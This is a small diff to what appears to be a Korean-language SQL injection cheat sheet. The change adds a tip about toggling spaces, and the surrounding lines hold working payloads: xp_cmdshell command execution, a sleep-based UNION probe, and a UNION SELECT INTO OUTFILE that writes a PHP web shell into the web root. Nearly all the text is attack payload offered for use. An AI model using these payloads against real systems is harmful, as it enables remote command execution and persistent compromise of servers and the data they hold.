@@ -114,6 +114,7 @@ EXECUTE xp_cmdshell 'whoami';
 ' UNION SELECT sleep(5);-- -
 ```
 → URL ENCODED로 실행해보기
+→ 띄워쓰기 on/off
 
 ```sql
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
